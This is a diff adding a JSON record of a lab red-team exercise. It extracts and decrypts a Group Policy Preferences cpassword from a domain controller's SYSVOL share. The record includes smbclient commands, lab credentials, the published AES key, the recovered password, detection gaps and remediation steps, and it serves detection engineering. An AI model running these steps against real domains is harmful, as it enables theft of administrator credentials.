@@ -1,0 +1,86 @@
+{
+  "id": "ATK-007",
+  "title": "GPP cpassword Extraction",
+  "sprint": 1,
+  "date": "2026-04-26",
+  "status": "complete",
+  "mitre": [
+    {
+      "tactic": "Credential Access",
+      "technique": "T1552.006",
+      "name": "Unsecured Credentials: Group Policy Preferences"
+    },
+    {
+      "tactic": "Discovery",
+      "technique": "T1135",
+      "name": "Network Share Discovery"
+    }
+  ],
+  "attacker": {
+    "host": "kali",
+    "ip": "10.10.10.99",
+    "tools": ["smbclient", "python3 + pycryptodome"],
+    "account_used": "jsmith:Password123!"
+  },
+  "target": {
+    "host": "DC01",
+    "ip": "10.10.10.40",
+    "share": "SYSVOL",
+    "file": "corp.local/Policies/{CORPLAB-GPP-TEST}/Machine/Preferences/Groups/Groups.xml"
+  },
+  "stages": [
+    {
+      "stage": 1,
+      "name": "SYSVOL enumeration",
+      "technique": "T1135",
+      "command": "smbclient //10.10.10.40/SYSVOL -U 'corp.local/jsmith%Password123!' -c 'recurse; ls'",
+      "result": "Full SYSVOL tree enumerated. Groups.xml found in {CORPLAB-GPP-TEST} policy folder.",
+      "detected": false,
+      "detection_note": "EC5140 not observed — SMB share browse indistinguishable from normal GP pull"
+    },
+    {
+      "stage": 2,
+      "name": "Groups.xml download",
+      "technique": "T1552.006",
+      "command": "smbclient ... -c 'get corp.local/Policies/{CORPLAB-GPP-TEST}/Machine/Preferences/Groups/Groups.xml /tmp/Groups.xml'",
+      "result": "File downloaded (850 bytes). cpassword=QYzGjG42upM6mQXrirfg52oa8I8Yh9dCwlJ39X420Hc= extracted.",
+      "detected": false,
+      "detection_note": "File read over SMB — no event log entry"
+    },
+    {
+      "stage": 3,
+      "name": "cpassword decryption",
+      "technique": "T1552.006",
+      "command": "python3 AES-CBC decrypt with published Microsoft key",
+      "result": "CorpAdmin2025!",
+      "detected": false,
+      "detection_note": "Local offline computation — zero network activity"
+    }
+  ],
+  "credential_recovered": {
+    "username": "CorpAdmin",
+    "password": "CorpAdmin2025!",
+    "cpassword": "QYzGjG42upM6mQXrirfg52oa8I8Yh9dCwlJ39X420Hc=",
+    "aes_key": "4e9906e8fcb66cc9faf49310620ffee8f496e806cc05799020 9b09a433b66c1b",
+    "source_file": "Groups.xml",
+    "gpo_guid": "{CORPLAB-GPP-TEST}"
+  },
+  "detection_summary": {
+    "stages_detected": 0,
+    "stages_total": 3,
+    "detection_rate": "0%",
+    "key_event_ids": [],
+    "notes": "Fully silent. SMB file read indistinguishable from normal Group Policy operations. No reliable reactive detection exists."
+  },
+  "visibility_gaps": ["VIS-008", "VIS-009"],
+  "remediation": [
+    "Apply MS14-025 — disables GPP password storage",
+    "Audit SYSVOL for XML files containing cpassword attribute",
+    "Delete all GPP files with cpassword",
+    "Rotate all credentials ever stored via GPP",
+    "Deploy LAPS for local admin account management"
+  ],
+  "sigma_rule": "sigma_gpp_cpassword_T1552.006.yml",
+  "sprint": 1,
+  "sprint_status": "COMPLETE"
+}
